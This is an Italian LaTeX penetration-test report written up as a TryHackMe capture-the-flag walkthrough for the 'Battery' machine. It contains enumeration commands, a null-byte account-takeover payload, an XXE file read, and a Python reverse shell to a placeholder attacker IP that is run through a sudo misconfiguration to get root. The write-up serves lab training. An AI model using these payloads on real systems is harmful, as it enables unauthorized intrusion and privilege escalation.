@@ -1,0 +1,225 @@
+\documentclass[a4paper,11pt]{article}
+
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{setspace}
+\usepackage{titlesec}
+
+\onehalfspacing
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    urlcolor=blue
+}
+
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10}
+}
+
+\title{\textbf{Penetration Test Report (OSCP Style)}\\Battery}
+\author{Franco Salvucci}
+\date{}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% --------------------------------------------------
+\section{Informazioni sul Target}
+
+\begin{itemize}
+    \item Target: 10.112.175.27
+    \item Ambiente: TryHackMe
+\end{itemize}
+
+% --------------------------------------------------
+\section{Enumerazione}
+
+\subsection{Port Scanning}
+
+\begin{lstlisting}
+nmap -sC -sV TARGET_IP
+\end{lstlisting}
+
+Porte aperte individuate:
+
+\begin{itemize}
+    \item 22/tcp – SSH
+    \item 80/tcp – HTTP
+\end{itemize}
+
+% --------------------------------------------------
+\subsection{Enumerazione Web}
+
+Directory brute forcing:
+
+\begin{lstlisting}
+gobuster dir -u http://TARGET_IP \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-x php,txt,html
+\end{lstlisting}
+
+Directory interessanti:
+
+\begin{itemize}
+    \item /register.php
+    \item /admin.php
+    \item /forms.php
+    \item /report
+\end{itemize}
+
+% --------------------------------------------------
+\section{Reverse Engineering}
+
+\subsection{Analisi del binario}
+
+Il file \texttt{/report} scarica un binario ELF.
+
+\begin{lstlisting}
+file report
+\end{lstlisting}
+
+Il binario viene aperto con Ghidra.
+
+Nel main viene identificato confronto con credenziali hardcoded:
+
+\begin{lstlisting}
+guest:guest
+\end{lstlisting}
+
+Il binario contiene inoltre:
+\begin{itemize}
+    \item lista utenti
+    \item funzione update password
+\end{itemize}
+
+% --------------------------------------------------
+\section{Accesso Amministrativo}
+
+\subsection{Null Byte Injection}
+
+È stato intercettato il traffico di registrazione con Burp Suite.
+
+Payload utilizzato:
+
+\begin{lstlisting}
+admin@bank.a%00
+\end{lstlisting}
+
+Registrando questo utente è possibile autenticarsi come admin.
+
+% --------------------------------------------------
+\section{XXE Exploitation}
+
+\subsection{Identificazione vulnerabilità}
+
+La pagina \texttt{/forms.php} processa XML input.
+
+Il contenuto XML viene riflesso nella risposta.
+
+% --------------------------------------------------
+\subsection{Payload XXE}
+
+È stato utilizzato payload XXE per leggere file locali.
+
+File letti:
+\begin{itemize}
+    \item /etc/passwd
+    \item file PHP applicativi
+\end{itemize}
+
+Dai file PHP vengono recuperate credenziali SSH.
+
+% --------------------------------------------------
+\section{Accesso SSH}
+
+\begin{lstlisting}
+ssh cyber@TARGET_IP
+\end{lstlisting}
+
+Accesso riuscito.
+
+% --------------------------------------------------
+\section{Privilege Escalation}
+
+\subsection{Enumerazione sudo}
+
+\begin{lstlisting}
+sudo -l
+\end{lstlisting}
+
+Output:
+
+\begin{lstlisting}
+(root) NOPASSWD:
+/usr/bin/python3 /home/cyber/run.py
+\end{lstlisting}
+
+% --------------------------------------------------
+\subsection{Sfruttamento}
+
+Il file \texttt{run.py} viene sostituito con payload reverse shell:
+
+\begin{lstlisting}
+import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("ATT_IP",9001));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/sh")
+\end{lstlisting}
+
+Listener:
+
+\begin{lstlisting}
+nc -lvnp 9001
+\end{lstlisting}
+
+Esecuzione:
+
+\begin{lstlisting}
+sudo /usr/bin/python3 /home/cyber/run.py
+\end{lstlisting}
+
+\textbf{Risultato: shell root ottenuta}
+
+% --------------------------------------------------
+\section{Proof of Compromise}
+
+\subsection{User Flag}
+
+\begin{lstlisting}
+/home/cyber/flag1.txt
+\end{lstlisting}
+
+\subsection{Root Flag}
+
+\begin{lstlisting}
+/root/root.txt
+\end{lstlisting}
+
+% --------------------------------------------------
+\section{Conclusioni}
+
+Il sistema è stato compromesso tramite:
+\begin{itemize}
+    \item Reverse engineering
+    \item Null byte injection
+    \item XXE
+    \item sudo misconfiguration
+\end{itemize}
+
+% --------------------------------------------------
+\section{Note}
+
+La macchina includeva anche un secondo metodo alternativo di privilege escalation non trattato in questo report.
+
+\end{document}
